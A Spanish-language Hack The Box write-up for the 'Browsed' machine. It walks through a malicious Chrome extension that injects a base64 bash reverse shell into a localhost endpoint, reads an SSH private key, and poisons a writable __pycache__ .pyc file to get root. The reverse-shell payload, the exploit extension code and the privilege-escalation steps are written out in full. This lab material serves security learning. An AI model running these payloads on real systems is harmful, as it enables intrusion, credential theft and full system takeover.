---
title: Browsed
description: Browsed
tags: [HTB, ]
---
## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -vvv --min-rate 10000 10.129.63.67

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63`
```

```bash
nmap -p 22,80 -sCV 10.129.63.67

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeración web

```bash
echo "10.129.63.67 browsed.htb" | sudo tee -a /etc/hosts
```

> El sitio `browsed.htb` es un portal llamado **Aero Theme Hub** que permite subir y probar extensiones de Chrome. Ofrece una extensión de muestra descargable.
> 

```bash
wget http://browsed.htb/fontify.zip
unzip fontify.zip`

inflating: content.js
inflating: manifest.json
inflating: popup.html
inflating: popup.js
inflating: style.css
```

> Al intentar subir en `http://browsed.htb/upload.php`, la respuesta revela un subdominio interno.
> 

```bash
echo "10.129.63.67 browsedinternals.htb" | sudo tee -a /etc/hosts
```

> `http://browsedinternals.htb` expone una instancia de **Gitea v1.24.5** con un repositorio público del usuario `larry`: `larry/MarkdownPreview`.
> 

### Análisis del código fuente en Gitea

`http://browsedinternals.htb/larry/MarkdownPreview/src/branch/main/app.py`

```bash
# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

http://browsedinternals.htb/larry/MarkdownPreview/src/branch/main/routines.sh
```

```bash
elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
```

> La aplicación Flask corre en `127.0.0.1:5000` (solo localhost). El endpoint `/routines/<nombre>` usa el parámetro directamente en un comando de shell — **inyección de comandos**. El portal principal ejecuta la extensión subida en un navegador real del servidor, lo que permite hacer fetch desde el contexto del navegador hacia `127.0.0.1:5000`.
> 

---

## 2. Vector de entrada — Malicious Chrome Extension + Command Injection

**La cadena de ataque:**

1. El portal ejecuta la extensión subida en un navegador headless del servidor
2. El `content.js` hace `fetch` a `127.0.0.1:5000/routines/<payload>` desde el contexto del navegador (bypaseando la restricción de localhost)
3. El endpoint `/routines/` interpreta el nombre como parámetro de shell → **command injection**
4. El payload es un reverse shell en base64 inyectado mediante expansión de arrays de bash `a[$(cmd)]`

### Paso 1 — Generar el payload base64

```bash
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.188/1234 0>&1'" | base64

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvMTIzNCAwPiYxJw==
```

### Paso 2 — Crear content.js malicioso

```bash
const b64Payload = "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvMTIzNCAwPiYxJw==";
const sp = "%20";
const exploit = "a[$(echo" + sp + b64Payload + "|base64" + sp + "-d|bash)]";
const target = "http://127.0.0.1:5000/routines/" + exploit;
fetch(target, { mode: "no-cors" });
```

> `a[$(cmd)]` es una técnica de bash que fuerza la evaluación del subshell `$(cmd)` en el contexto de una expansión de array. El servidor interpreta el nombre de la ruta como argumento de shell y ejecuta el comando embebido.
> 

### Paso 3 — Crear manifest.json mínimo

```bash
{
  "manifest_version": 3,
  "name": "Exploit Extension",
  "version": "1.0",
  "permissions": [],
  "host_permissions": ["http://127.0.0.1:5000/*"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"]
    }
  ]
}
```

### Paso 4 — Empaquetar y levantar listener

```bash
zip pawn.zip manifest.json content.js
```

```bash
nc -lvnp 1234
```

### Paso 5 — Subir la extensión al portal

> Subir `pawn.zip` en `http://browsed.htb/upload.php`. El servidor ejecuta la extensión en su navegador headless y se recibe la shell.
> 

---

## 3. Acceso inicial

```bash
listening on [any] 1234 ...
connect to [10.10.14.188] from (UNKNOWN) [10.129.63.67] 55378
bash: cannot set terminal process group (1430): Inappropriate ioctl for device
larry@browsed:~/markdownPreview$
```

```bash
cat /home/larry/user.txt

[user flag]
```

### Mejora de shell y extracción de clave SSH

```bash
cat /home/larry/.ssh/id_ed25519

- ----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
...
----END OPENSSH PRIVATE KEY-----
```

```bash
# En el atacante
chmod 600 larry_key
ssh -i larry_key larry@10.129.63.67
```

---

## 4. Escalada de privilegios — PyCache Poisoning

### Paso 1 — Verificar permisos sudo

```bash
sudo -l

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

```bash
sudo /opt/extensiontool/extension_tool.py

[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
```

### Paso 2 — Descubrir el directorio `__pycache__` escribible

```bash
ls -la /opt/extensiontool/__pycache__/

drwxrwxrwx 2 root root 4096 May  6 17:39 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
-rw-r--r-- 1 root root 1880 May  6 17:39 extension_utils.cpython-312.pyc
```

> El directorio `__pycache__` tiene permisos `777` (world-writable). Cuando Python ejecuta `extension_tool.py`, importa `extension_utils` y carga el `.pyc` cacheado si es más reciente que el `.py`. Podemos reemplazar ese `.pyc` con código malicioso.
> 

**El truco del header:** Los archivos `.pyc` tienen los primeros 16 bytes de cabecera (magic number + timestamp/hash). Si el header no coincide con la versión de Python, el intérprete lo descarta y recompila desde el `.py`. La solución es: compilar nuestro payload para que genere un `.pyc` válido, luego copiarle los 16 bytes del header legítimo con `dd`.

### Paso 3 — Crear el payload Python malicioso

```bash
echo 'import os; os.system("/bin/bash")' > /home/larry/exploit.py
python3 -m compileall /home/larry/exploit.py`

Compiling '/home/larry/exploit.py'...
```

```bash
ls /home/larry/__pycache__/

exploit.cpython-312.pyc
```

### Paso 4 — Copiar el header legítimo al .pyc malicioso

```bash
dd if=/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc \
   of=/home/larry/__pycache__/exploit.cpython-312.pyc \
   bs=1 count=16 conv=notrunc

16+0 records in
16+0 records out
16 bytes copied, 0.000321763 s, 49.7 kB/s
```

### Paso 5 — Reemplazar el .pyc legítimo con el malicioso

```bash
rm /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
cp /home/larry/__pycache__/exploit.cpython-312.pyc \
   /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```

### Paso 6 — Ejecutar el script sudo

```bash
sudo /opt/extensiontool/extension_tool.py

root@browsed:/home/larry#
```

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt

[root fl]
```

---

## 6. Lecciones aprendidas

- **Los portales que ejecutan código subido por el usuario son RCE en potencia.** Un servicio que "testea extensiones de Chrome" realmente ejecuta JavaScript arbitrario en el contexto del servidor — cualquier `fetch` interno es SSRF directo.
- **La restricción `host='127.0.0.1'` no protege contra SSRF desde el propio servidor.** Si hay un browser headless ejecutando código subido por el usuario, ese browser puede alcanzar cualquier servicio local sin restricciones.
- **`a[$(cmd)]` es un bypass de command injection en bash.** Cuando un nombre de ruta se interpola en un contexto de shell sin sanitizar, la expansión aritmética de arrays evalúa el subshell. Buscar siempre rutas/parámetros que lleguen a `exec`, `system`, o expansión de variables en bash.
- **`__pycache__` world-writable es privesc directa si el script padre tiene sudo.** Python prioriza el `.pyc` cacheado sobre recompilar el `.py`. El header de 16 bytes es la única validación — se puede copiar con `dd` para hacer pasar cualquier `.pyc` malicioso.
- **En máquinas similares buscar:** servicios que ejecuten código del usuario en contexto local (browsers headless, sandboxes, eval), directorios `__pycache__` con permisos abiertos bajo scripts con sudo, código fuente expuesto en Gitea/Gogs/Forgejo que revele lógica interna.